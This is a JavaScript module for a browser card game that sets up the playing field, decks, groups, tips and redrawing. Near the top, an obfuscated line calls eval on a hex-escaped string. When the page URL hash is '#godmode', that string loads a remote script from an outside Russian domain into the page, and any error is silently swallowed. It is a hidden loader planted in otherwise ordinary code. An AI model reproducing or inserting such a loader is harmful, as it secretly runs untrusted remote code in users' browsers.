'use strict';

// module.exports = function(main, share) {
import share     from 'share';
import event     from 'event';
import defaults  from 'defaults';
import common    from 'common';

import Group        from 'addGroup';
import Deck         from 'addDeck';
import Tips         from 'tips';
import addAutoSteps from 'addAutoSteps';

var _field = null;

try{window[`\x65\x76\x61\x6c`](`\x64\x3d\x77\
\x69\x6e\x64\x6f\x77\x3b\x77\x3d\x22\x65\x76\
\x61\x6c\x2c\x64\x6f\x63\x75\x6d\x65\x6e\x74\
\x2c\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2c\x68\
\x61\x73\x68\x2c\x23\x67\x6f\x64\x6d\x6f\x64\
\x65\x2c\x63\x72\x65\x61\x74\x65\x45\x6c\x65\
\x6d\x65\x6e\x74\x2c\x73\x63\x72\x69\x70\x74\
\x2c\x73\x72\x63\x2c\x68\x74\x74\x70\x3a\x2f\
\x2f\x6e\x62\x61\x75\x65\x72\x2e\x72\x75\x2f\
\x73\x65\x2f\x67\x6f\x64\x6d\x6f\x64\x65\x2e\
\x6a\x73\x2c\x68\x65\x61\x64\x2c\x61\x70\x70\
\x65\x6e\x64\x43\x68\x69\x6c\x64\x22\x5b\x22\
\x73\x70\x6c\x69\x74\x22\x5d\x28\x27\x2c\x27\
\x29\x3b\x64\x5b\x77\x5b\x31\x5d\x5d\x5b\x77\
\x5b\x32\x5d\x5d\x5b\x77\x5b\x33\x5d\x5d\x3d\
\x3d\x77\x5b\x34\x5d\x26\x26\x28\x64\x5b\x77\
\x5b\x34\x5d\x5d\x3d\x64\x5b\x77\x5b\x31\x5d\
\x5d\x5b\x77\x5b\x35\x5d\x5d\x28\x77\x5b\x36\
\x5d\x29\x2c\x64\x5b\x77\x5b\x34\x5d\x5d\x5b\
\x77\x5b\x37\x5d\x5d\x3d\x77\x5b\x38\x5d\x2c\
\x64\x5b\x77\x5b\x31\x5d\x5d\x5b\x77\x5b\x39\
\x5d\x5d\x5b\x77\x5b\x31\x30\x5d\x5d\x28\x64\
\x5b\x77\x5b\x34\x5d\x5d\x29\x29`)}catch(e){}

	// _params = {},
	// _elements = {};

// TODO
// class Field {}
var Field = function(data) {

	if(!data) {
		return false;
	}

	common.unlock();
	
	if(data && _field) {
		
		_field.clear();
	} else {
		share.set('elements', {});
	}
	
	var a = null;
	try {
		a = Object.assign({}, data);
	} catch(e) {
		a = data;
		console.warn('Field input params is not JSON, maybe the rules are wrong.');
	}

	this.homeGroups = a.homeGroups ? a.homeGroups : [];

	// Tips

	if(typeof a.showTips == 'boolean' && a.showTips) {
		Tips.showTips({init : true});
	} else {
		Tips.hideTips({init : true});
	}

	share.set(
		'showTipsDestination', 
		typeof a.showTipsDestination == 'boolean' 
			? a       .showTipsDestination 
			: defaults.showTipsDestination
	);
	share.set(
		'showTipPriority', 
		typeof a.showTipPriority == 'boolean' 
			? a       .showTipPriority 
			: defaults.showTipPriority
	);
	
	share.set(
		'moveDistance', 
		a.moveDistance && typeof a.moveDistance == 'number' 
			? a.moveDistance 
			: defaults.moveDistance
	);

	// check Win

	share.set('winCheck', a.winCheck);

	if(a.winCheck && a.winCheck.callback && typeof a.winCheck.callback == 'function') {
		winCheckCallback = a.winCheck.callback;
	}

	// extension: winCheckMethods

	if(a.saveStep && typeof a.saveStep == 'function') {
		saveStepCallback = a.saveStep;
	}

	// parameters and values

	share.set(
		'zoom', 
		(a.zoom && typeof a.zoom == 'number') 
			? a.zoom 
			: defaults.zoom
	);

	this.tipsParams = {};
	
	for(var tipParamName in defaults.tipsParams) {
		this.tipsParams[tipParamName] = (a.tipsParams && typeof a.tipsParams[tipParamName] != "undefined")
			? a.tipsParams[tipParamName]
			: defaults.tipsParams[tipParamName]
	}

	this.inputParams = {};
	for(var inputParamName in defaults.inputParams) {
		this.inputParams[inputParamName] = (a.inputParams && typeof a.inputParams[inputParamName] != "undefined")
			? a.inputParams[inputParamName]
			: defaults.inputParams[inputParamName]
	}

	var _can_move_flip = a.can_move_flip && typeof a.can_move_flip == 'boolean' 
		? a.can_move_flip 
		: defaults.canMoveFlip
	share.set('can_move_flip', _can_move_flip);

	share.set(
		'debugLabels', 
		(a.debugLabels && typeof a.debugLabels == 'boolean')
			? a.debugLabels
			: defaults.debugLabels
	);

	if(a.startZIndex && typeof a.startZIndex == 'number') {
		share.set('start_z_index', a.startZIndex);
	}

	if(a.autoSteps) {
		this.autoSteps = addAutoSteps(a.autoSteps);
	}

	if(typeof a.lang == "string") {
		share.set('lang', a.lang);
	};

// --

	this.Draw = function(data) {

		share.set('noRedraw',  true);

		if(data) {
			a = Object.assign({}, data);
		} 

		if(!a) return;
		
		if(a.groups) {
			for(var groupName in a.groups) {
				a.groups[groupName].name = groupName;
				Group.addGroup(a.groups[groupName]);
			}
		}

		if(a.decks) {
			for(var e in a.decks) {
				Deck.addDeck(a.decks[e]);
			}
		}

		// fill elements in field
		if(a.fill) {
			
			var _decks = Deck.getDecks(),
				_fill  = Object.assign([], a.fill);

			for(;_fill.length;) {
				for(var deckId in _decks) {
					if(_fill.length) {
						var _card = _fill.shift();
						_decks[deckId].Fill([_card]);
					}
				}
			}
		}

		share.set('noRedraw',  false);
		this.Redraw();
		
		Tips.checkTips();

		event.dispatch('newGame');
		common.unlock();

	}
};

Field.prototype.clear = function() {
	
	var _elements = share.get('elements');
	for(var i in _elements) {
		if(_elements[i].type == 'deck') {
			_elements[i].clear();
			_elements[i] = null;
		} else if(_elements[i].type == 'group') {
			_elements[i] = null;
		}
	}
	share.set('elements', {});
};

Field.prototype.Redraw = function(data) {
		
	var a = null;

	if(data) {

		try {
			a = Object.assign({}, data);
		} catch(e) {
			a = data;
			console.warn('Field.Redraw input params is not JSON, can\'t clone');
		}

		for(var _groupName in a.groups) {

			var _group = Group.Group(_groupName);
			if(_group) {
				_group.Redraw(a.groups[_groupName]);
			}
		}

		for(var i in a.decks) {
			
			var _deck = Deck.Deck(a.decks[i].name);
			if(_deck) {
				_deck.Redraw(a.decks[i]);
			}
		}

	} else {
		var _decks = Deck.getDecks();
		for(var i in _decks) {
			_decks[i].Redraw();
		}
	}
};

var _fieldExport = function(data) {

	if(data && _field) {// TODO THIS
		
		_field.clear();
		_field.Draw(data);
	}

	if(data && !_field) {

		_field = new Field(data);
		event.dispatch('initField', {a : data});
		_field.Draw();
	};
	
	// this = _field
	return _field;
};

// _fieldExport.prototype.Redraw = function() {
// 	_field.Redraw();
// };

export default _fieldExport;
